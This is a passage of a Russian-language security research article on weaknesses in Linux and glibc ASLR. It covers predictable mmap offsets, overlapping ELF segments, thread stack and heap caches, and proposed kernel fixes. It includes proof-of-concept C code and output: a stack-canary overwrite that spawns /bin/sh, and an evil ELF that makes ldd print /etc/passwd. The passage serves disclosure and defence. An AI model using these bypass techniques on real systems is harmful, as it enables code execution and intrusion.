maplength = loadcmds[nloadcmds ‐ 1].allocend ‐ loadcmds[0].mapstart;
...
for (const struct loadcmd *c = loadcmds; c < &loadcmds[nloadcmds]; ++
c)
...
/* Map the segment contents from the file.  */
if (__glibc_unlikely (__mmap ((void *) (l‐>l_addr + c‐>mapstart),
                  maplen, c‐>prot,
                  MAP_FIXED|MAP_COPY|MAP_FILE,
                  fd, c‐>mapoff)

Алгоритм обработки всех сегментов следующий:
 1. Вычислить размер загруженного ELF‐фай ла — как адрес окончания пос‐
   леднего сегмента минус адрес начала первого.
 2. Выделить память с помощью mmap для всего ELF‐файла с вычисленным
   размером, тем самым получив базовый адрес загрузки ELF‐файла.
 3. В случае с glibc — изменить права дос тупа. В слу чае загрузки из ядра —
   освободить регионы, образующие дыр ки. В этом пункте поведение glibc
   и ядра Linux отличается, как было описано ранее в раз деле 4.4.
 4. Выделить память с помощью mmap и выставленного флага MAP_FIXED
   для  всех  оставшихся  сегментов,  используя  адрес,  полученный
   при выделении пер вого сегмента, и добавив к нему смещение, получа‐
  емое из заголовка ELF‐файла.

Это дает злоумышленнику воз можность сделать ELF‐файл, один из сегментов
которого может полностью переопределить сущес твующий реги он памяти,
например стек потока, кучу или код библиотеки.
  Примером уязвимого приложения может служить утилита ldd, с помощью
которой проверяется наличие в системе необходимых биб лиотек. Утилита
использует интерпретатор ld. Благодаря найденной проблеме с загрузкой
ELF‐файлов удалось выполнить произвольный код, используя ldd:


blackzert@crasher:~/aslur/tests/evil_elf$ ldd ./main
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
blackzert@crasher:~/aslur/tests/evil_elf$

В данном случае был прочитан файл /etc/passwd. Нормальный же запуск
выглядит примерно следующим образом:


blackzert@crasher:~/aslur/tests/evil_elf$ ldd ./main
    linux‐vdso.so.1 =>  (0x00007ffc48545000)
    libevil.so => ./libevil.so (0x00007fbfaf53a000)
    libc.so.6 => /lib/x86_64‐linux‐gnu/libc.so.6 (0x00007fbfaf14d000)
    /lib64/ld‐linux‐x86‐64.so.2 (0x000055dda45e6000)

В ознакомительных целях исходный код этого при мера приводится в папке
evil_elf.
  Вопрос о MAP_FIXED также был поднят в сообществе Linux  (Hocko,
Michal. Mm: introduce MAP_FIXED_SAFE), однако на данный момент пред‐
ложенный патч не принят.


4.8. Кеш выделен ной памяти
В glibc также существует множес тво разных кешей, среди которых есть два
наиболее интересных в контексте ASLR — кеш для стека создаваемого
потока и кеш для  кучи. Кеш для стека работает сле дующим образом:
по завершении потока память стека не будет освобождена, а будет помеще‐
на в соответствующий кеш. При соз дании стека потока glibc сначала проверя‐
ет кеш и, если в нем есть регион необходимой длины, использует этот реги‐
он. В этом случае обра щения к mmap не пос ледует и новый поток будет
использовать ранее используемый регион, имеющий те же самые адреса.
Если злоумышленнику удалось получить адрес стека потока и он может кон‐
тролировать создание и удаление потоков программой, то он может исполь‐
зовать полученное зна ние адреса для экс плуатации соответствующей уяз‐
вимости. Кроме того, если приложение содержит неинициализированные
переменные, их значения также могут быть подконтрольны злоумышленнику,
что в некоторых случаях может приводить к экс плуатации.
  Кеш для кучи потока работа ет следующим образом: после завершения
потока созданная для него куча отправляется в соответс твующий кеш.
При следующем создании кучи для нового потока сначала проверяется кеш,
и, если в нем есть регион, он будет использован. Тогда также справедливо
все сказанное для стека.


5. ПРИМЕРЫ
Возможно, mmap исполь зует ся и в других случаях. А значит, обнаруженная
проблема приводит к целому классу потенциально уяз вимых приложений.
  Можно выделить нес колько примеров, наг лядно показы вающих найден‐
ные проблемы.


5.1. Сте ки двух потоков
В данном примере создадим два потока с помощью pthread_create и пос чита‐
ем разницу между локальными переменными обоих потоков. Исходный код:


int * p_a = 0;
int * p_b = 0;
void *first(void *x)
{
    int a = (int)x;
    p_a = &a;
    sleep(1);
    return 0;
}
void *second(void *x)
{
    int b = (int)x;
    p_b = &b;
    sleep(1);
    return 0;
}
int main()
{
    pthread_t one, two;
    pthread_create(&one, NULL, &first, 0);
    pthread_create(&two, NULL, &second, 0);
    void *val;
    pthread_join(one,&val);
    pthread_join(two, &val);
    printf("Diff: 0x%x\n", (unsigned long)p_a ‐ (unsigned long)p_b);
    printf("first thread stack variable: %p second thread stack
vairable: %p\n", p_a, p_b);
    return 0;
}

Вывод после пер вого запус ка:


blackzert@crasher:~/aslur/tests$ ./threads_stack_constant
Diff: 0x801000
first thread stack variable: 0x7facdf356f44 second thread stack
vairable: 0x7facdeb55f44

Вывод после вто рого запус ка:


blackzert@crasher:~/aslur/tests$ ./threads_stack_constant
Diff: 0x801000
first thread stack variable: 0x7f360cebef44 second thread stack
vairable: 0x7f360c6bdf44

Как видно, при разных адресах переменных разность между ними остается
неизменной. В примере она обоз начена словом Diﬀ, сами же значения адре‐
сов приводятся ниже. Данный пример демонс трирует возможность воз дей‐
ствия уязвимого кода из стека одного потока на дру гой поток или на любой
соседний регион памяти — независимо от работы ASLR.


5.2. Стек потока и большой буфер, выделен ный с помощью
malloc
Теперь в главном потоке приложения выделим боль шой объем памяти через
malloc и запустим новый поток. Посчитаем разницу между адресом, получен‐
ным malloc, и переменной в стеке созданно го нового потока. Исходный код:


void *ptr;
void * first(void *x)
{
        int a = (int)x;
        int *p_a = &a;
        int pid = getpid();
        printf("Diff:%lx\nmalloc: %p, stack: %p\n", (unsigned long
long)ptr ‐ (unsigned long long)p_a, ptr, p_a);
        return 0;
}
int main()
{
        pthread_t one;
        ptr = malloc(128 * 4096 * 4096 ‐ 64);
        pthread_create(&one, NULL, &first, 0);
        void *val;
        pthread_join(one,&val);
        return 0;
}

Вывод после пер вого запус ка:


blackzert@crasher:~/aslur/tests$ ./big_heap_thread_stack_constant
Diff:11ec
malloc: 0x7f4374ab2010, stack: 0x7f4374ab0e24

Вывод после вто рого запус ка:


blackzert@crasher:~/aslur/tests$ ./big_heap_thread_stack_constant
Diff:11ec
malloc: 0x7f9b00d4b010, stack: 0x7f9b00d49e24

Опять же, разность неизменна. Данный пример демонстрирует возможность
воздействия уязвимого кода при обработке буфера с большим размером
байтов, выделенного через malloc, на стек созданного потока — вне зависи‐
мости от работы ASLR.


5.3. Mmap и стек потока
Выделим память с помощью mmap и запус тим новый поток через pthread‐
_create. Посчитаем разницу между адресом, выделенным через mmap,
и адресом переменной в стеке созданного потока. Исходный код:


void * first(void *x)
{
    int a = (int)x;
    int *p_a = &a;
    void *ptr = mmap(0, 8 * 4096 *4096, 3, MAP_ANON | MAP_PRIVATE, ‐1
, 0);
    printf("%lx\n%p, %p\n", (unsigned long long)p_a ‐ (unsigned long
long)ptr, ptr, p_a);
    return 0;
}
int main()
{
    pthread_t one;
    pthread_create(&one, NULL, &first, 0);
    void *val;
    pthread_join(one,&val);
    return 0;
}

Вывод после пер вого запус ка:


blackzert@crasher:~/aslur/tests$ ./thread_stack_mmap_constant
87fff34
0x7f35b0e3d000, 0x7f35b963cf34

Вывод после вто рого запус ка:


blackzert@crasher:~/aslur/tests$ ./thread_stack_mmap_constant
87fff34
0x7f5a1083f000, 0x7f5a1903ef34

Разность неизменна. Данный пример демонс трирует возможность воздей‐
ствия уязвимого кода при обработке буфера, выделенного через mmap,
на стек созданного потока — вне зависимости от работы ASLR.


5.4. Mmap и TLS главного потока
Выделим память с помощью mmap и получим адрес TLS главного потока.
Посчитаем разницу между этими адресами. Удостоверимся, что значение
«канарейки» в стеке главного потока совпада ет со значением из TLS.
Исходный код:


int main(int argc, char **argv, char **envp)
{
    int res;
    char buffer[256];
    sprintf(buffer, "%.255s",argv[0]);
    unsigned long * frame = __builtin_frame_address(0);
    unsigned long * tls;
        res = arch_prctl(ARCH_GET_FS, &tls);
    unsigned long * addr = mmap(0, 8 * 4096 *4096, 3, MAP_ANON |
MAP_PRIVATE, ‐1, 0);
    if (addr == MAP_FAILED)
        return ‐1;
    printf("TLS %p , FRAME %p\n", tls, frame);
    printf(" stack cookie: 0x%lx, from tls 0x%lx\n", frame[‐1], tls[5
]);
    printf("from mmap to TLS: 0x%lx\n", (char *)tls ‐ (char*)addr);
    unsigned long diff = tls ‐ addr;
    tcbhead_t *head = (tcbhead_t*)&addr[diff];
    printf("cookie from addr: 0x%lx\n", head‐>stack_guard);
    printf("cookie == stack_cookie? %d\n", head‐>stack_guard == frame
[‐1]);
    return 0;
}

Вывод после пер вого запус ка:


blackzert@crasher:~/aslur/tests$ ./mmap_tls_constant
TLS 0x7f520540c700 , FRAME 0x7ffed15ba130
 stack cookie: 0x94905ec857965c00, from tls 0x94905ec857965c00
from mmap to TLS: 0x85c8700
cookie from addr: 0x94905ec857965c00
cookie == stack_cookie? true

Вывод после вто рого запус ка:


blackzert@crasher:~/aslur/tests$ ./mmap_tls_constant
TLS 0x7f6d4a081700 , FRAME 0x7ffe8508a2f0
 stack cookie: 0x51327792302d5300, from tls 0x51327792302d5300
from mmap to TLS: 0x85c8700
cookie from addr: 0x51327792302d5300
cookie == stack_cookie? true

Как видно, разность не меняется от запуска к запуску, а значения «канарейки»
совпали. Это означает, что при наличии соответству ющей уязвимости можно
изменить «канарейку» и обойти эту защиту. Например — при наличии уяз‐
вимости переполнения буфера в стеке и уязвимости, позволя ющей писать
память по смещению от выделен ного с помощью mmap региона. В рассмот‐
ренном примере смещение будет равно 0x85c8700. Этот пример демонс‐
трирует метод обхода ASLR и «канарейку».


5.5. Mmap и glibc
О похожем примере уже говорилось в разделе 4.2, но вот еще при мер:
выделим память через mmap и получим разницу между этим адре сом и фун‐
кциями system и execv из библиотеки glibc — исходный код:


int main(int argc, char **argv, char **envp)
{
    int res;
    system(""); // call to make lazy linking
    execv("", NULL); // call to make lazy linking
    unsigned long addr = (unsigned long)mmap(0, 8 * 4096 *4096, 3,
MAP_ANON | MAP_PRIVATE, ‐1, 0);
    if (addr == MAP_FAILED)
        return ‐1;
    unsigned long addr_system = (unsigned long)dlsym(RTLD_NEXT,
"system");
    unsigned long addr_execv = (unsigned long)dlsym(RTLD_NEXT,
"execv");
    printf("addr %lx system %lx execv %lx\n", addr, addr_system,
addr_execv);
    printf("system ‐ addr %lx execv ‐ addr %lx\n", addr_system ‐ addr
, addr_execv ‐ addr);
    return 0;
}

Вывод после пер вого запус ка:


blackzert@crasher:~/aslur/tests$ ./mmap_libc
addr 7f02e9f85000 system 7f02f1fca390 execv 7f02f2051860
system ‐ addr 8045390 execv ‐ addr 80cc860

Вывод после вто рого запус ка:


blackzert@crasher:~/aslur/tests$ ./mmap_libc
addr 7f534809c000 system 7f53500e1390 execv 7f5350168860
system ‐ addr 8045390 execv ‐ addr 80cc860

Как видно, разница меж ду выделен ным регионом и функциями неизменна.
Данный пример демонс трирует метод обхода ASLR, если уязвимый код
работает с буфером, выделенным через mmap. Постоянными будут рассто‐
яния в байтах не только до функций биб лиотек, но и для данных, что также
может быть использовано при эксплуата ции приложения.


5.6. Пе репол нение буфера на сте ке дочернего потока
Создадим новый поток и переполним буфер на стеке до TLS‐значения. Если
аргументов в командной строке нет, не будем переписывать «канарейку»
в TLS, в противном же случае перепишем ее. Эта логика с аргументами была
выбрана, просто чтобы можно было показывать разницу в поведении прог‐
раммы.
  Переписывать будем байтом 0x41. Исходный код:


void pwn_payload() {
    char *argv[2] = {"/bin/sh", 0};
    execve(argv[0], argv, 0);
}
int fixup = 0;
void * first(void *x)
{
    unsigned long *addr;
    arch_prctl(ARCH_GET_FS, &addr);
    printf("thread FS %p\n", addr);
    printf("cookie thread: 0x%lx\n", addr[5]);
    unsigned long * frame = __builtin_frame_address(0);
    printf("stack_cookie addr %p \n", &frame[‐1]);
    printf("diff : %lx\n", (char*)addr ‐ (char*)&frame[‐1]);
    unsigned long len =(unsigned long)( (char*)addr ‐ (char*)&frame[‐
1]) + fixup;
    // example of exploitation
    // prepare exploit
    void *exploit = malloc(len);
    memset(exploit, 0x41, len);
    void *ptr = &pwn_payload;
    memcpy((char*)exploit + 16, &ptr, 8);
    // exact stack‐buffer overflow example
    memcpy(&frame[‐1], exploit, len);
    return 0;
}
int main(int argc, char **argv, char **envp)
{
    pthread_t one;
    unsigned long *addr;
    void *val;
    arch_prctl(ARCH_GET_FS, &addr);
    if (argc > 1)
        fixup = 0x30;
    printf("main FS %p\n", addr);
    printf("cookie main: 0x%lx\n", addr[5]);
    pthread_create(&one, NULL, &first, 0);
    pthread_join(one,&val);
    return 0;
}

В данном примере защите уда лось обна ружить переполнение на стеке
и завершить приложение с ошиб кой до перехвата управле ния злоумыш‐
ленником. А теперь переза пишем эталонное значение «канарейки»:


blackzert@crasher:~/aslur/tests$ ./thread_stack_tls
main FS 0x7fa0e8615700
cookie main: 0xb5b15744571fd00
thread FS 0x7fa0e7e2f700
cookie thread: 0xb5b15744571fd00
stack_cookie addr 0x7fa0e7e2ef48
diff : 7b8
*** stack smashing detected ***: ./thread_stack_tls terminated
Aborted (core dumped)

Во втором случае мы успешно переписали «канарейку» и выполнилась фун‐
кция pwn_payload, с запуском интерпретато ра sh.


blackzert@crasher:~/aslur/tests$ ./thread_stack_tls  1
main FS 0x7f4d94b75700
cookie main: 0x2ad951d602d94100
thread FS 0x7f4d94385700
cookie thread: 0x2ad951d602d94100
stack_cookie addr 0x7f4d94384f48
diff : 7b8
$ ^D
blackzert@crasher:~/aslur/tests$

Данный пример демонстрирует метод обхода защиты от перепол нения
на стеке. Для успешной эксплуата ции зло умышленни ку необходимо иметь
возможность перезаписать достаточное число байтов, чтобы перезаписать
эталонное значение «канарейки». В представленном примере злоумыш‐
леннику необходимо перезаписать как минимум 0x7b8+0x30 байт, что рав‐
но 2024 байт.


5.7. Стек потока и буфер маленького раз мера, выделен ный
с помощью malloc
Теперь создадим поток, в нем выделим память с помощью malloc и посчита‐
ем разность с локальной переменной в этом потоке. Исходный код:


void * first(void *x)
{
        int a = (int)x;
        int *p_a = &a;
    void *ptr;
        ptr = malloc(8);
    printf("%lx\n%p, %p\n", (unsigned long long)ptr ‐ (unsigned long
long)p_a, ptr, p_a);
        return 0;
}
int main()
{
        pthread_t one;
        pthread_create(&one, NULL, &first, 0);
        void *val;
        pthread_join(one,&val);
        return 0;
}

Первый запуск программы:


blackzert@crasher:~/aslur/tests$ ./thread_stack_small_heap
fffffffff844e98c
0x7f20480008c0, 0x7f204fbb1f34

И второй запуск программы:


blackzert@crasher:~/aslur/tests$ ./thread_stack_small_heap
fffffffff94a598c
0x7fa3140008c0, 0x7fa31ab5af34

В этом случае разность не совпала. При чем от запуска к запуску она не сов‐
падет. Попробуем разобраться почему.
  Первое, что сле дует заметить: адрес ука зателя, полученного  malloc,
не соответствует адресу кучи [heap] процесса.
   Glibc создает новую кучу для каждого соз данного с помощью pthread_cre‐
ate потока. Указатель на эту кучу лежит в TLS потока, поэтому любой поток
выделяет память из «сво ей» кучи, что дает выигрыш в производительности:
не надо обеспечивать синхронизацию потоков в слу чае конкурентного malloc.
  Но почему адрес «случаен»?
   Glibc при выделе нии новой кучи использует mmap, причем размер зависит
от конфигурации. В моем случае раз мер кучи равняется 64 Мбайт. Адрес
начала кучи должен быть выровнен на 64 Мбайт. Поэтому сначала выделя‐
ется  128  Мбайт,  в  выделенном  диапа зоне  выделяется  выровненный
кусок 64 Мбайт, а остатки осво бож дают ся, и меж ду полученным адресом кучи
и ближайшим регионом, выделен ным ранее с помощью mmap, образуется
«дырка».
   Случайность же вносит само ядро еще при выборе mmap_based: этот
адрес не выровнен на 64 Мбайт, как и все выделения памяти mmap, иду щие
до вызова рассматриваемого malloc.
  Независимо от причины требова ния к выровненности адреса это при‐
водит к очень интересному эффекту — появляется воз можность перебора.
  Известно, что адресное пространс тво процесса для x86‐64 определено
                                                                        47в ядре Linux как 47bits minus one guard page, то есть с округлением 2  (здесь
и далее для простоты мы специально опустим вычитание размера одной
страницы при вычислении размеров). 64 Мбайт — это 226, и значащих битов
                                                         21остается 47 – 26 = 21. То есть может быть всего 2  различных куч второс‐
тепенных потоков.
  При необходимости это существенно сокращает множес тво перебора.
   Благодаря выбору mmap адреса известным образом можно утверждать,
что куча первого потока, созданного через pthread_create, будет выбрана
в 64 Мбайт, близких к верхнему диапа зону адресов. А точнее, рядом со все ми
загруженными библиотеками, загруженными файлами и подобным.
   Иногда возможно вычис лить общий объем памяти, выделенной до вызова
заветного malloc. В нашем случае загружены только glibc, ld и соз дан стек
для потока. Поэтому это значение мало.
  В разделе 6 будет показа но, как выбирается адрес mmap_base, однако
сейчас немного  дополнительной информа ции: mmap_base выбирается
с энтропией от 28 до 32 бит в зависимости от настройки ядра при ком‐
пиляции (по умолчанию 28 бит). И на это зна чение отстает некоторая верхняя
граница.
   Таким образом, в боль шой доле случаев старшие 7 бит адре са будут 0x7f
и в редких случаях 0x7e. Это дает нам еще 7 бит опре деленности. Итого
              14получается 2  возможных вариантов выбора кучи для первого потока. Чем
больше потоков создано, тем больше будет умень шаться это число для сле‐
дующего выбора кучи.
  Покажем это поведение следующим кодом на C:


void * first(void *x)
{
    int a = (int)x;
    void *ptr;
    ptr = malloc(8);
    printf("%p\n", ptr );
    return 0;
}
int main()
{
    pthread_t one;
    pthread_create(&one, NULL, &first, 0);
    void *val;
    pthread_join(one,&val);
    return 0;
}

И запустим эту программу дос таточное число раз, собирая статистику адре‐
сов, кодом на Python:


import subprocess
d = {}
def dump(iteration, hysto):
    print 'Iteration %d len %d'%(iteration, len(hysto))
    for key in sorted(hysto):
        print hex(key), hysto[key]
i = 0
while i < 1000000:
    out = subprocess.check_output(['./t'])
    addr = int(out, 16)
    #omit page size
    addr >>= 12
    if addr in d:
        d[addr] += 1
    else:
        d[addr] = 1
    i += 1
dump(i,d)

Данный код достаточное число раз запус кает простую программу ./t,
которая создает новый поток, выделяет в ней буфер с помощью malloc
и выводит адрес выделенного буфера. Пос ле того как программа отработа‐
ла, адрес считывается и считается, сколько раз этот адрес встре чался за вре‐
мя работы. В результате скрипт собира ет 16 385 раз личных адресов, что рав‐
     14но 2  + 1. Столько попыток может сделать злоумышленник в худшем случае
для того, чтобы угадать адрес кучи рас сматриваемой программы.
   Есть еще вариант «стек потока и большой буфер, выделенный с помощью
malloc», но он мало чем отличается от описанного. Единственное отличие:
в случае большого размера буфера снова вызовется mmap, и сложно ска‐
зать, куда попадет выделен ный регион, — он может заполнить образовав‐
шуюся дырку или встать перед кучей.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      ПРЕДСКАЗАНИЕ
       СЛУЧАЙНОСТИ
                 ИЗУЧАЕМ ASLR В LINUX И GNU LIBC,
                 ОБХОДИМ ЗАЩИТУ АДРЕСНОГО
                   ПРОСТРАНСТВА И STACK CANARY





5.8. Кеш сте ка и кучи потока
В этом примере создадим поток и выделим в нем память с помощью malloc.
Запомним адре са стека потока и ука зателя, полученного с помощью malloc.
Инициализируем некоторую переменную в стеке значением 0xdeadbeef.
Завершим поток и создадим новый, выделим память с помощью malloc.
Сравним адреса и значения переменной, на этот раз неинициализирован‐
ной. Исходный код:


void * func(void *x)
{
    long a[1024];
    printf("addr: %p\n", &a[0]);
    if (x)
        printf("value %lx\n", a[0]);
    else
    {
        a[0] = 0xdeadbeef;
        printf("value %lx\n", a[0]);
    }
    void * addr = malloc(32);
    printf("malloced %p\n", addr);
    free(addr);
    return 0;
}
int main(int argc, char **argv, char **envp)
{
    int val;
    pthread_t thread;
    pthread_create(&thread, NULL, func, 0);
    pthread_join(thread, &val);
    pthread_create(&thread, NULL, func, 1);
    pthread_join(thread, &val);
    return 0;
}

Результат работы программы:


blackzert@crasher:~/aslur/tests$ ./pthread_cache
addr: 0x7fd035e04f40
value deadbeef
malloced 0x7fd030000cd0
addr: 0x7fd035e04f40
value deadbeef
malloced 0x7fd030000cd0

На примере видно, что адреса локальных переменных в сте ке для потоков,
созданных друг за другом, не отличаются. Также не отличаются и адреса
переменных, выделенных для них с помощью malloc. А некоторые значения
локальных перемен ных первого потока все еще дос тупны второму потоку.
Злоумышленник может использовать  это при  эксплуатации  уязвимости
неинициализированных переменных (Use of Uninitialized Variable). Кеш хоть
и ускоряет работу приложения, одна ко предос тавля ет возможности для экс‐
плуатации и обхода ASLR.


6. ВЫЧИСЛЕНИЕ КАРТЫ АДРЕСНОГО ПРОСТРАНСТВА ПРОЦЕССА
Когда создается новый процесс, ядро следует алгоритму для определения
его адресного пространства:
 1. После вызова execve вир туальная память про цесса пол ностью очищается.
 2. Создается самая первая vma, описыва ющая стек процесса (stack_base).
                                              47   Изначально его адрес выбира ется как 2  – pagesize (где pagesize — раз‐
  мер страницы, в случае x86‐64 равный 4096), а впос ледс твии сдвигается
   на некоторую случайную величину random1, не превышающую 16 Гбайт
   (происходит это доволь но поздно, после выбора базы бинарного файла,
   поэтому возможны интересные эффекты: если бинарный файл приложе‐
   ния займет всю память, стек окажется рядом с базовым адре сом бинар‐
   ного файла).
 3. Ядро выбирает mmap_base — адрес, относительно которого впоследс‐
   твии будут загружены все библиотеки в адресном прос транстве процесса.
  Определяется этот адрес как stack_base – random2 – 128 Мбайт, где ran‐
  dom2 — случайная величина, верхняя граница которой зависит от нас‐
   тройки ядра и имеет предел от 1 до 16 Тбайт.
 4. Ядро пробует загрузить бинарный файл программы. Если файл явля ется
   PIE (не зависящим от базового адреса загрузки), базовый адрес выбира‐
               47   ется как (2  – 1) * 2/3 + random3, где случай ная величина random3 также
   определяется   конфигурацией   ядра  и  имеет   верхний  предел
   от 1 до 16 Тбайт.
 5. Если файл нуждается в динамически подгружаемых библиотеках, ядро
   пробует загрузить программу‐интерпретатор, которая должна будет заг‐
   рузить все необ ходимые библиотеки и произвести ини циализации. Обыч‐
   но в качестве интерпретатора в ELF‐файлах указан ld из glibc. Адрес
   выбирается относительно mmap_base.
 6. Ядро устанавливает кучу нового процес са как конец загруженного ELF‐
  файла  плюс  некото рое  случайное  random4  с  верхней  границей
   в 32 Мбайт.

Когда все этапы прошли, процесс запускается, и в качестве стартового адре‐
са будет адрес либо из ELF‐файла интерпретатора (ld), либо из самого ELF‐
файла программы, если интерпретатор отсутству ет (статичес ки «слинкован‐
ный» ELF).
   Если включен ASLR и есть возможность загрузки по произвольному адре‐
су у файла программы, про цесс будет иметь следующий вид.
  Каждая  библиотека,  будучи  загруженной  интерпретатором,  получит
управление, если в ней определен список глобаль ных конструкторов. В этом
случае будут вызваны функции библиотеки для выделения ресурсов (глобаль‐
ные конструкторы), необходимых этой биб лиотеке.





Благодаря известному порядку загрузки биб лиотек можно получить некото‐
рую точку в потоке выполнения программы, позволяющую построить рас‐
положение регионов памяти друг относительно дру га независимо от работы
ASLR. Чем больше будет извес тно о библиотеках, их конструкторах и поведе‐
нии программы, тем дальше эта точка будет отставать от точки создания про‐
цесса.
  Для определения конкретных адресов все же нужна уязвимость, поз воля‐
ющая получить адрес некоторого mmap‐региона либо позволяющая читать
(писать) память отно сительно некоторого mmap‐региона:
 • когда  злоумышленнику  известен  адрес  некоторого mmap‐региона,
   выделенного от момента старта процес са до точки константного выпол‐
   нения (раздел 4.3), атакующий может успешно вычис лить mmap_base
   и адрес любой загруженной библиотеки или любого другого mmap‐реги‐
   она;
 • в случае возможнос ти адресовать ся относительно некоторого mmap‐
   региона из точки константно го выполнения — допол нительно какой‐либо
  еще адрес знать необязательно.

Для доказательства пос троения карты памяти процесса был написан код
на Python, имитирующий поведение ядра при поис ке новых регионов. Также
был повторен способ загрузки ELF‐фай лов и порядок загрузки библиотек.
Для имитации  уязвимос ти, поз воляющей прочитать адреса библиотек,
использовалась файловая система /proc: скрипт счи тывает адрес ld (таким
образом восстанавливает mmap_base) и повторяет карту памяти процес са,
имея библиотеки. После чего сравнива ет с оригина лом. Скрипт полностью
повторял адресное пространс тво всех процессов. Код скрипта также дос‐
тупен.


Век торы атак
Рассмотрим некоторые уязвимос ти, уже ставшие клас сическими из‐за своей
распространенности.


1. Ошиб ки перепол нения буфера на куче
Широко известны разные уязвимос ти при работе приложений с кучей glibc
и также методы их эксплуатации. Из всех методов можно выделить два
типа — либо они позволяют модифицировать память относительно адре са
уязвимой кучи, либо они позволяют модифицировать адре са памяти, извес‐
тные атакующему. В некоторых случаях есть возможность читать произволь‐
ные данные с объектов на куче. Отсюда мож но получить несколько векторов:
 • в случае модифицирования (чтения) памяти относительно объекта в куче
   в  первую  оче редь  нас  интересует  куча  потока,  созданного  через
  pthread_create, так как расстояние от нее до любой библиотеки (стека)
   потока будет меньше, чем от кучи главного потока;
 • в случае чтения (записи) памяти относительно некоторого адреса в пер‐
   вую очередь нужно про бовать прочитать адреса с самой кучи, поскольку
   там обычно лежат указатели на vtable или на libc.main_arena. Знание
   адреса libc.main_arena влечет за собой зна ние адреса glibc и впос‐
   ледствии mmap_base. Зна ние адреса vtable может дать либо адрес
   некоторой библиотеки (следова тельно, и mmap_base), либо адрес заг‐
   рузки программы. Если известен адрес загрузки программы, можно
   вычитать адреса биб лиотек из секции .got.plt, содержащей адреса
   на необходимые функции библиотек.


2. Перепол нение буфера
 • на стеке приводит к рассмотренному варианту с «канарейкой»;
 • на куче приводит к варианту, рас смот ренно му в пункте 1;
 • на регионе mmap приводит к переза писи соседних регионов и зависит
   от контекста.


7. ИСПРАВЛЕНИЯ
В данной статье описано несколько проб лем, рас смотрим исправления
для некоторых из них. Начнем с самых прос тых и далее перейдем к более
сложным.


7.1. Дырка в ld.so
Как было показано в раз деле 4.4, загрузчик ELF‐интерпретатора в ядре Linux
содержит ошибку и допус кает освобождение час ти памяти биб лиотеки интер‐
претатора. Соответствующее исправление было предложено сообщес тву,
однако не получило должного внимания.


7.2. По рядок загрузки сегментов ELF-файла
Как было отмечено выше, в ядре и в коде библиотеки glibc отсутствует про‐
верка ELF‐сегментов файла — код просто доверя ет тому, что они составлены
в правильном порядке. PoC данной проб лемы приложен, как и исправление.
  Исправление доволь но прос тое: мы про ходим по сегментам и проверяем,
что текущий не перекрывает следующий и сегменты упорядочены по воз‐
растанию vaddr.


7.3. Учитывание mmap_min_addr при поиске адре са выделе ния
mmap
Как только было написано исправление для mmap, позволяющее возвращать
адреса с достаточной энтропией, возникла проб лема: некоторые вызовы
mmap завершались неудачно с ошибкой прав дос тупа. Даже от рута, даже
если запрошены из ядра при исполнении execve.
  В алгоритме выбора адреса (описанного в разделе 3) был пункт «провер‐
ка адреса на ограничения, свя занные с безопас ностью». В текущей реали‐
зации эта проверка убеждается, что выб ранный адрес больше mmap_min_ad‐
dr. Это переменная системы, доступная к изменению адми нистратором
через sysctl. Администратор системы может задать любое значение, и про‐
цесс не сможет выделить страницу по адресу меньше этого значения.
По умолчанию значение это го параметра 65536.
  Проблема была в том, что при вызове функции выбора адреса для mmap
в архитектуре x86‐64 ядро Linux использовало зна чение допус тимой нижней
границы  4096,  что  мень ше  зна чения  mmap_min_addr.  И  функция
cap_mmap_addr запрещает операцию, если выб ранный адрес лежит меж‐
ду 4096 и mmap_min_addr.
   cap_mmap_addr  вызывается  неявно:  эта  функция  зарегистрирована
«хуком» для проверки безопас ности. Данное архитектурное решение вызыва‐
ет вопросы: сначала мы выбира ем адрес, не имея возможности проверить
его по каким‐то внешним критериям, а потом мы проверяем его допус‐
тимость в соот ветствии с текущими параметрами системы. И если адрес
не прошел проверку, то даже в случае, когда адрес выбирается ядром, он
может быть «зап рещенным» и вся операция завершится с ошибкой EPERM.
  Злоумышленник может вос пользовать ся этим, чтобы добиться отказа
от работы всей системы: если зло умышленнику удастся указать очень боль‐
шое значение, в системе не сможет запуститься ни один пользовательский
процесс. А если зло умышленник сможет сохранить это значение в парамет‐
рах системы, то даже перезагрузка не поможет — все соз даваемые процес‐
сы будут получать EPERM и завершаться с ошиб кой.
  В качестве исправления на данный момент было добавлено исполь‐
зование значения mmap_min_addr при зап росе к функции поиска адреса
в качестве минимально воз можного адреса. Такой же код уже используется
для всех других архитектур.
  Вопрос с тем, что будет, если администра тор сис темы начнет менять
это значение на работающей машине, оста ется открытым — все новые
выделения после изменения могут завершаться с ошибкой EPERM, а ни один
код программы попросту не ожидает такой ошиб ки и не знает, что с ней
делать. В документации к mmap сказано следующее:



     EPERM The operation was prevented by a file seal; see fcntl(2).

То есть ядро не может вернуть EPERM на MAP_ANONYMOUS, хотя на деле
это не так.


7.4. Mmap
Основная  рассматрива емая  проблема mmap —  отсутствие  энтропии
при выборе адре са. Логичное исправление, если в идеале, — выбрать память
случайно. Чтобы выбрать случайно, нужно сначала пос троить список всех
свободных  регионов,  подходящих  по  раз меру. После  нужно выбрать
из полученного списка случайный регион и адрес из этого региона, удов‐
летворяющий критериям поиска — длине запрашива емого реги она и допус‐
тимым нижней и верхней гра ницам.
  Для реализации этой логики можно выделить несколько следующих под‐
ходов:
 1. Держать список пустот в упорядоченном по убыванию массиве. При этом
  выбор случайного элемента делается за одну операцию, однако под‐
  держание этого мас сива требует множества операций по освобождению
   (выделению) памяти при изменении текущей карты виртуального адресно‐
   го пространства процесса.
 2. Держать список пус тот в дереве и списке, чтобы за логарифм от чис ла
   пустот находить крайнюю границу, удовлетво ряющую по длине, и выбирать
   случайный эле мент из массива. Если он не подходит по ограниче ниям
   минимального  (максимального)  допус тимого  адре са,  выбрать  сле‐
  дующий — и так далее, пока не будет найден необходимый или не оста‐
   нется ни одного. В этом подходе нуж но поддерживать сложные структуры
   списка и дерева ана логично уже сущес твующим для vma при изменении
   адресного пространства.
 3. Использовать существу ющую структуру рас ширенного красно‐черного
